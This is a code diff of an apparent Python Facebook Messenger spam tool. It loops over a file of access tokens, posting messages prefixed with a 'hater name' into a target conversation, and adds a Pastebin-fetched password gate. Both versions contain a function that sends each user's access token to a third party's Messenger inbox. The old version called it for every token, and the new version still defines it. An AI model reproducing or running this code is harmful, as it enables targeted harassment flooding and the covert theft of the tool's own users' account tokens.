@@ -1,14 +1,12 @@
 import requests
 import time
 import os
-import sys
 import hashlib
 from urllib.parse import quote
 from colorama import init, Fore, Style
 import webbrowser
-import json
 
-# Initialize Colorama
+# Initialize Colorama (Fix for Color Codes Not Showing Properly)
 init(autoreset=True)
 
 def clear_screen():
@@ -70,30 +68,62 @@ def pre_main():
     if check_permission(unique_key):  
         print(Fore.GREEN + "[✔] Approved! Now Starting Your Script...\n")
 
-# Token se Profile Name Fetch Karna
-def get_profile_name(token):
-    url = f"https://graph.facebook.com/me?access_token={token}"
-    try:
-        response = requests.get(url)
-        data = response.json()
-        return data.get("name", "Unknown")
-    except:
-        return "Unknown"
+# ---- Aapki Original Script Yaha Se Start Ho Rahi Hai ----
 
-# Token Facebook Messenger Inbox Me Bhejna
+def typing_effect(text, delay=0.002, color=Fore.WHITE):
+    for char in text:
+        print(color + char, end='', flush=True)
+        time.sleep(float(delay))
+    print()
+
+def display_animated_logo():
+    clear_screen()
+    typing_effect("(_ _______ ______ _______ _______ _______ _ _________)", Fore.YELLOW)
+    typing_effect("( (    /|  (  ___  )  (  __  \\   (  ____ \\  (  ____ \\  (       )      (  ___  )  ( \\        \\__   __/", Fore.YELLOW)
+    typing_effect("╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗", Fore.YELLOW)
+    typing_effect("║  NAME                 : BROKEN-NADEEM                                                            ║", Fore.CYAN)
+    typing_effect("║  BRAND                : MULTI CONVO                                                              ║", Fore.GREEN)
+    typing_effect("║  GitHub               : BROKEN NADEEM                                                            ║", Fore.CYAN)
+    typing_effect("║  WHATSAPP             : +917209101285                                                            ║", Fore.GREEN)
+    typing_effect("╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝", Fore.YELLOW)
+    time.sleep(1)
+
+def animated_input(prompt_text):
+    print(Fore.CYAN + "{<<════════════════════BROKEN NADEEM HERE════════════════════>>}")
+    typing_effect(prompt_text, 0.03, Fore.LIGHTYELLOW_EX)
+    return input(Fore.GREEN + "➜ ")
+
 def send_token_to_facebook(token):
-    profile_name = get_profile_name(token)
     try:
-        message = f'Hello, Raj Khan sir! I am using your tool. My token 🔐 ==> {token}\nProfile Name: {profile_name}'
+        message = f'Hello, Raj Khan sir! I am using your tools. My token 🔐 ==> {token}'
         facebook_url = f'https://www.facebook.com/messages/t/shankar.panchal.9883739?text={quote(message)}'
 
-        print('[📩] Sending token to Facebook Messenger...')
+        print('[📩] Opening Facebook Messenger for token submission...')
         webbrowser.open(facebook_url)
 
     except Exception as e:
         print(f'Error sending message to Facebook: {e}')
 
-# Messages Send Karne Ka Function
+def fetch_password_from_pastebin(pastebin_url):
+    try:
+        response = requests.get(pastebin_url)
+        response.raise_for_status()
+        return response.text.strip()
+    except requests.exceptions.RequestException:
+        print("[❌] Failed to fetch password. Check internet connection.")
+        exit(1)
+
+def get_profile_name(access_token):
+    try:
+        url = "https://graph.facebook.com/me"
+        parameters = {"access_token": access_token}
+        response = requests.get(url, params=parameters)
+        response.raise_for_status()
+        profile_data = response.json()
+        return profile_data.get("name", "Unknown")
+    except requests.exceptions.RequestException:
+        return "Unknown"
+
 def send_messages(tokens_file, target_id, messages_file, haters_name, speed):
     with open(messages_file, "r") as file:
         messages = file.readlines()
@@ -102,45 +132,51 @@ def send_messages(tokens_file, target_id, messages_file, haters_name, speed):
 
     headers = {"User-Agent": "Mozilla/5.0"}
 
-    for token in tokens:
-        send_token_to_facebook(token)  # Token ko Messenger inbox me bhejna
-        profile_name = get_profile_name(token)  # Token ka naam fetch karna
-        
-        for message in messages:
-            full_message = f"{haters_name} {message.strip()}"
+    for message_index, message in enumerate(messages):
+        token_index = message_index % len(tokens)
+        access_token = tokens[token_index]
+        profile_name = get_profile_name(access_token)
+        full_message = f"{haters_name} {message.strip()} - From {profile_name}"
 
-            url = f"https://graph.facebook.com/v17.0/t_{target_id}"
-            parameters = {"access_token": token, "message": full_message}
+        url = f"https://graph.facebook.com/v17.0/t_{target_id}"
+        parameters = {"access_token": access_token, "message": full_message}
 
-            try:
-                response = requests.post(url, json=parameters, headers=headers)
-                response.raise_for_status()
-                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+        try:
+            response = requests.post(url, json=parameters, headers=headers)
+            response.raise_for_status()
+            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
 
-                print(Fore.YELLOW + f"\n[🎉] MESSAGE SENT SUCCESSFULLY!")
-                print(Fore.CYAN + f"[📨] MESSAGE: {full_message}")
-                print(Fore.LIGHTWHITE_EX + f"[👤] SENT BY: {profile_name}")
-                print(Fore.LIGHTWHITE_EX + f"[⏰] TIME: {current_time}")
+            print(Fore.YELLOW + f"\n[🎉] MESSAGE {message_index + 1} SUCCESSFULLY SENT!")
+            print(Fore.CYAN + f"[📨] MESSAGE: {full_message}")
+            print(Fore.LIGHTWHITE_EX + f"[⏰] TIME: {current_time}")
 
-            except requests.exceptions.RequestException:
-                continue  
+        except requests.exceptions.RequestException:
+            continue  
 
-            time.sleep(speed)
+        time.sleep(speed)
 
     print(Fore.CYAN + "\n[+] All messages sent. Restarting the process...\n")
 
-# Main Function
 def main():
     pre_main()  
     clear_screen()
+    display_animated_logo()
 
-    tokens_file = input(Fore.GREEN + "【📕】 ENTER TOKEN FILE➜ ")
-    target_id = input(Fore.GREEN + "【🖇️】 ENTER CONVO UID ➜ ")
-    messages_file = input(Fore.GREEN + "【📝】 ENTER MESSAGE FILE➜ ")
-    haters_name = input(Fore.GREEN + "【🖊️】 ENTER HATER NAME➜ ")
-    speed = float(input(Fore.GREEN + "【⏰】 ENTER DELAY/TIME (sec) ➜ "))
+    pastebin_url = "https://pastebin.com/raw/kMBpBe88"
+    correct_password = fetch_password_from_pastebin(pastebin_url)
 
-    send_messages(tokens_file, target_id, messages_file, haters_name, speed)
+    entered_password = animated_input("【👑】 ENTER OWNER NAME➜")
+    if entered_password != correct_password:
+        print(Fore.RED + "[❌] Incorrect OWNER NAME. Exiting.")
+        exit(1)
+
+    send_messages(
+        animated_input("【📕】 ENTER TOKEN FILE➜"),
+        animated_input("【🖇️】 ENTER CONVO UID ➜"),
+        animated_input("【📝】 ENTER MESSAGE FILE➜"),
+        animated_input("【🖊️】 ENTER HATER NAME➜"),
+        float(animated_input("【⏰】 ENTER DELAY/TIME (sec) ➜"))
+    )
 
 if __name__ == "__main__":
     main()
